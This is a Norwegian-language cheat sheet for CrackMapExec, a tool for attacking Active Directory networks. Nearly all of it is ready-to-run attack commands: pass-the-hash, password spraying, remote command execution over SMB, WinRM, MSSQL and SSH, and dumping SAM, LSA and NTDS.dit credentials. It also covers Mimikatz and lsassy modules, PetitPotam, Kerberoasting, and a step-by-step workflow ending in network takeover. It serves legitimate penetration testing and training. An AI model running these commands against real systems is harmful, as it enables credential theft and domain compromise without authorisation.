# 🗡️ CrackMapExec – sveitsisk lommekniv for AD

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Versjonsmerknad:** Dette er en CrackMapExec/CME-referanse. NetExec viderefører prosjektet som en egen, fellesskapsdrevet gren; navn, moduler og alternativer er ikke nødvendigvis identiske. Eksemplene er beholdt i opprinnelig CME-syntaks. [NetExec: første utgivelse og bakgrunn](https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/news/v1.0.0-release.md).
>
> **Presisering:** `--no-bruteforce` skal ikke forstås som «prøv hver kombinasjon»; den opprinnelige kommentaren er selvmotsigende. Utdatamerket `(Pwn3d!)` beskriver verktøyets tilgangsvurdering for aktuell vert/protokoll, ikke kontroll over hele domenet. DCSync avhenger av replikeringsrettigheter, ikke nødvendigvis medlemskap i Domain Admins. [NetExec-dokumentasjon](https://www.netexec.wiki/), [Microsoft: replikeringsrettighet](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all).

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec – en sveitsisk lommekniv for pentesting
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er CrackMapExec](#-hva-er-crackmapexec)
- [Installasjon](#-installasjon)
- [SMB-protokollen](#-smb-protokollen)
- [WinRM-protokollen](#-winrm-protokollen)
- [LDAP-protokollen](#-ldap-protokollen)
- [MSSQL-protokollen](#-mssql-protokollen)
- [SSH-protokollen](#-ssh-protokollen)
- [Moduler](#-moduler)
- [Passordspraying](#-passordspraying)
- [Database](#-database)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er CrackMapExec

**CrackMapExec** (CME) er et verktøy for vurdering av nettverk etter innledende kompromittering. Det støtter:

- 🖥️ **SMB** – Delinger, økter og kjøring
- 🔧 **WinRM** – Fjernadministrasjon med PowerShell
- 📂 **LDAP** – AD-kartlegging
- 🗄️ **MSSQL** – Angrep mot SQL Server
- 🐧 **SSH** – Linux-mål
- 💉 **Pass-the-Hash** – Gjenbruk av legitimasjon

### Funksjoner

| Funksjon | Beskrivelse |
|---------|-------------|
| **Flere protokoller** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Parallell kjøring** | Angrip flere mål |
| **Legitimasjonsdatabase** | Hold oversikt over kompromittert legitimasjon |
| **Moduler** | Kan utvides med egne moduler |
| **Utdataformater** | Flere utdataalternativer |

---

## 🚀 Installasjon

### Kali Linux

```bash
# Installer via apt
sudo apt update
sudo apt install crackmapexec

# Eller via pipx (anbefalt)
pipx install crackmapexec
```

### Bruke pipx

```bash
# Installer pipx først
sudo apt install pipx
pipx ensurepath

# Installer CME
pipx install crackmapexec
```

### Verifiser

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-smb-protokollen"></a>
## 🖥️ SMB-protokollen

### Grunnleggende kartlegging

```bash
# Kontroller om vertene svarer
cme smb 10.10.10.0/24

# Kartlegg med legitimasjon
cme smb 10.10.10.10 -u user -p password

# Domeneautentisering
cme smb 10.10.10.10 -u user -p password -d domain.local

# Lokal autentisering
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

```bash
# SMB med NTLM-hash
cme smb 10.10.10.10 -u user -H NTLMHASH

# Full LM:NTLM-hash
cme smb 10.10.10.10 -u user -H LM:NTLM

# Prøv hashen på tvers av nettverket
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Kartlegging av delinger

```bash
# List delinger
cme smb 10.10.10.10 -u user -p password --shares

# Søk gjennom delinger etter filer
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# List filer rekursivt
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Brukerkartlegging

```bash
# List brukere via RPC
cme smb 10.10.10.10 -u user -p password --users

# List grupper
cme smb 10.10.10.10 -u user -p password --groups

# List påloggede brukere
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Hent brukernes SID-er
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Kommandokjøring

```bash
# Kjør kommando
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell-kjøring
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Forskjellige kjøringsmetoder
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Uthenting av legitimasjon

```bash
# Hent ut SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Hent ut LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Hent ut NTDS.dit (krever DA på domenekontrolleren)
cme smb DC01.domain.local -u admin -p password --ntds

# Hent ut NTDS med bestemt metode
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### SMB-signering

```bash
# Kontroller SMB-signering (for relay-angrep)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 WinRM-protokollen

### Grunnleggende bruk

```bash
# Kontroller WinRM-tilgang
cme winrm 10.10.10.10 -u user -p password

# Kontroller flere mål
cme winrm 10.10.10.0/24 -u user -p password

# Med hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Kommandokjøring

```bash
# Kjør kommando
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Kjør skript
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Uthenting av legitimasjon

```bash
# Hent ut SAM via WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# LSA-hemmeligheter
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 LDAP-protokollen

### Kartlegging

```bash
# Grunnleggende LDAP-spørring
cme ldap DC01.domain.local -u user -p password

# List brukere
cme ldap DC01 -u user -p password --users

# List grupper
cme ldap DC01 -u user -p password --groups

# Brukere utsatt for AS-REP roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Brukere utsatt for Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Passordpolicy

```bash
# Hent passordpolicy
cme ldap DC01 -u user -p password --password-policy
```

### Brukerattributter

```bash
# Hent brukerbeskrivelser
cme ldap DC01 -u user -p password -M get-desc-users

# Hent bestemte attributter
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-mssql-protokollen"></a>
## 🗄️ MSSQL-protokollen

### Grunnleggende bruk

```bash
# Koble til MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Windows-autentisering
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Med hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Kommandokjøring

```bash
# Kjør via xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Aktiver xp_cmdshell først
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Kjør kommando
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 SSH-protokollen

### Grunnleggende bruk

```bash
# SSH-kontroll
cme ssh 10.10.10.10 -u root -p password

# Flere mål
cme ssh 10.10.10.0/24 -u user -p password

# Med nøkkelfil
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Kommandokjøring

```bash
# Kjør kommando
cme ssh 10.10.10.10 -u root -p password -x "id"

# Flere kommandoer
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Moduler

### List moduler

```bash
# List alle moduler
cme smb -L
cme winrm -L
cme ldap -L

# Modulhjelp
cme smb -M mimikatz --options
```

### Populære moduler

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (hent ut LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# GPP-passord
cme smb DC01 -u user -p password -M gpp_password

# GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### BloodHound-innsamling

```bash
# Samle BloodHound-data
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Passordspraying

### Grunnleggende spraying

```bash
# Ett passord mot flere brukere
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Flere passord
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Ikke bruk brute force (prøv hver kombinasjon)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Spraying i nettverket

```bash
# Spray på tvers av nettverket
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Fra fil med mål
cme smb targets.txt -u admin -p password --continue-on-success
```

### Vær oppmerksom på kontolåsing

```bash
# Kontroller passordpolicyen først
cme ldap DC01 -u user -p password --password-policy

# Utdata:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Database

### CME-database

```bash
# Vis legitimasjon
cmedb

# Inne i cmedb:
creds           # List lagret legitimasjon
hosts           # List skannede verter
```

### Eksporter data

```bash
# Utdataformater
cme smb 10.10.10.10 -u user -p password --log log.txt

# JSON-utdata
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Hurtigreferanse

### Autentiseringsmetoder

| Metode | Alternativ |
|--------|--------|
| Passord | `-p password` |
| NTLM-hash | `-H HASH` |
| AES-nøkkel | `--aesKey KEY` |
| Kerberos | `-k` |
| Lokal autentisering | `--local-auth` |

### Protokoller

| Protokoll | Port | Bruksområde |
|----------|------|----------|
| SMB | 445 | Fildelinger og kjøring |
| WinRM | 5985/5986 | Fjernadministrasjon med PowerShell |
| LDAP | 389/636 | AD-kartlegging |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Linux-systemer |

### Vanlige flagg

| Flagg | Beskrivelse |
|------|-------------|
| `-u` | Brukernavn (eller fil) |
| `-p` | Passord (eller fil) |
| `-H` | NTLM-hash |
| `-d` | Domene |
| `-x` | Kommando (cmd) |
| `-X` | Kommando (PowerShell) |
| `--shares` | List delinger |
| `--users` | List brukere |
| `--sam` | Hent ut SAM |
| `--lsa` | Hent ut LSA |
| `--ntds` | Hent ut NTDS |

### Utdatamarkører

| Markør | Betydning |
|--------|---------|
| `[+]` | Vellykket |
| `[-]` | Mislykket |
| `[*]` | Informasjon |
| `(Pwn3d!)` | Administratortilgang bekreftet |

### Typisk arbeidsflyt

```bash
# 1. Nettverksskanning
cme smb 10.10.10.0/24

# 2. Passordspraying
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Kontroller administratortilgang
cme smb 10.10.10.0/24 -u user -p password

# 4. Hent ut legitimasjon
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Bruk funnet legitimasjon
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Ressurser

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [CME-moduler](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Relaterte hurtigreferanser
- [BloodHound](../../BloodHound/translations/README.nb.md)
- [Impacket](../../Impacket/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)

---

<p align="center">
  <b>🗡️ Ta kontroll over nettverket!</b><br>
  <i>CrackMapExec – pentesterens sveitsiske lommekniv</i>
</p>
